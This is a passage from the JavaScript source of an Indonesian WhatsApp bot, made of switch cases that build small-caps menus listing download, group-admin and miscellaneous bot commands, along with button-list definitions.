            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'othermenubutton': {
let teks =`┏『 *\`乂 ᴏ ᴛ ʜ ᴇ ʀ - ᴍ ᴇ ɴ ᴜ 乂\`* 』━◧
║◦ *${prefix}ping*
║◦ *${prefix}brat*
║◦ *${prefix}ceksewa*
║◦ *${prefix}listsewa*
║◦ *${prefix}readviewonce*
║◦ *${prefix}cekkhodam*
║◦ *${prefix}yandere*
║◦ *${prefix}alkitab*
║◦ *${prefix}totalfitur*
║◦ *${prefix}menu*
║◦ *${prefix}myip*
║◦ *${prefix}reportbug*
║◦ *${prefix}listpem*
║◦ *${prefix}liststicker*
║◦ *${prefix}listimage*
║◦ *${prefix}listvideo*
║◦ *${prefix}listvn*
║◦ *${prefix}listbadword*
║◦ *${prefix}listpc*
║◦ *${prefix}listgc*
║◦ *${prefix}owner*
║◦ *${prefix}jadibot*
║◦ *${prefix}listjadibot*
║◦ *${prefix}donate*
║◦ *${prefix}friend*
║◦ *${prefix}obfuscate*
║◦ *${prefix}styletext*
║◦ *${prefix}fliptext*
║◦ *${prefix}tts*
║◦ *${prefix}say*
║◦ *${prefix}togif*
║◦ *${prefix}toqr*
║◦ *${prefix}bass*
║◦ *${prefix}blown*
║◦ *${prefix}deep*
║◦ *${prefix}earrape*
║◦ *${prefix}fast*
║◦ *${prefix}fat*
║◦ *${prefix}nightcore*
║◦ *${prefix}reverse*
║◦ *${prefix}robot*
║◦ *${prefix}slow*
║◦ *${prefix}smooth*
║◦ *${prefix}squirrel*
║◦ *${prefix}tinyurl*
║◦ *${prefix}tinyurl*
║◦ *${prefix}tovn*
║◦ *${prefix}toaudio*
║◦ *${prefix}tomp3*
║◦ *${prefix}tomp4*
║◦ *${prefix}toimg*
║◦ *${prefix}toonce*
║◦ *${prefix}sticker*
║◦ *${prefix}take*
║◦ *${prefix}emoji*
║◦ *${prefix}volume*
║◦ *${prefix}ebinary*
║◦ *${prefix}dbinary*
║◦ *${prefix}ssweb*
║◦ *${prefix}quoted*
║◦ *${prefix}runtime*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'downloadmenubutton': { 
let teks =`┏『 *\`乂 ᴅ ᴏ ᴡ ɴ ʟ ᴏ ᴀ ᴅ - ᴍᴇɴᴜ 乂\`* 』━◧
║◦ ${prefix}tiktok
║◦ ${prefix}tiktokslide
║◦ ${prefix}videy
║◦ ${prefix}tiktokaudio
║◦ ${prefix}filmsearch
║◦ ${prefix}ytsearch <mp3>
║◦ ${prefix}ytsearch2 <mp4>
║◦ ${prefix}ttsearch
║◦ ${prefix}teraboxdl
║◦ ${prefix}snackvideo
║◦ ${prefix}capcutdl
║◦ ${prefix}play
║◦ ${prefix}playyt
║◦ ${prefix}ytplay (link youtubenya)
║◦ ${prefix}playspotify
║◦ ${prefix}ytmp3
║◦ ${prefix}ytmp4
║◦ ${prefix}google
║◦ ${prefix}imdb
║◦ ${prefix}weather
║◦ ${prefix}wanumber
║◦ ${prefix}instagram
║◦ ${prefix}facebook
║◦ ${prefix}twittervid
║◦ ${prefix}spotify
║◦ ${prefix}gitclone
║◦ ${prefix}happymod
║◦ ${prefix}gdrive
║◦ ${prefix}pinterest
║◦ ${prefix}ringtone
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ᴍᴀʜɪʀᴜ ᴀssɪsᴛᴀɴᴛ`, 
        highlight_label: `Reinzz offc`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'groupmenubutton': {
let teks =`┏『 *\`乂 ɢ ʀ ᴏ ᴜ ᴘ - ᴍᴇɴᴜ 乂\`* 』━◧
║◦ *${prefix}sider*
║◦ *${prefix}autoaigc*
║◦ *${prefix}warcall*
║◦ *${prefix}autosimi*
║◦ *${prefix}mahiruchat*
║◦ *${prefix}mute*
║◦ *${prefix}setwelcome*
║◦ *${prefix}setleft*
║◦ *${prefix}welcome on/off*
║◦ *${prefix}antilink*
║◦ *${prefix}antiwame*
║◦ *${prefix}linkgc*
║◦ *${prefix}invite*
║◦ *${prefix}ephemeral*
║◦ *${prefix}delete*
║◦ *${prefix}setppgroup*
║◦ *${prefix}delppgroup*
║◦ *${prefix}setname*
║◦ *${prefix}setdesc*
║◦ *${prefix}add*
║◦ *${prefix}kick*
║◦ *${prefix}promote*
║◦ *${prefix}demote*
║◦ *${prefix}hidetag*
║◦ *${prefix}totag*
║◦ *${prefix}tagall*
║◦ *${prefix}editinfo*
║◦ *${prefix}opentime*
║◦ *${prefix}closetime*
║◦ *${prefix}resetlink*
║◦ *${prefix}getbio*
║◦ *${prefix}vote*
║◦ *${prefix}upvote*
║◦ *${prefix}downvote*
║◦ *${prefix}checkvote*
║◦ *${prefix}delvote*
║◦ *${prefix}autostickergc*
║◦ *${prefix}antilinkgc*
║◦ *${prefix}antiwame*
║◦ *${prefix}antilinkall*
║◦ *${prefix}antilinktiktok*
║◦ *${prefix}antilinkfb*
║◦ *${prefix}antilinktwitter*
║◦ *${prefix}antilinkig*
║◦ *${prefix}antilinktg*
║◦ *${prefix}antilinkytvid*
║◦ *${prefix}antilinkytch*
║◦ *${prefix}antivirus*
║◦ *${prefix}antitoxic*
║◦ *${prefix}nsfw*
║◦ *${prefix}react*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
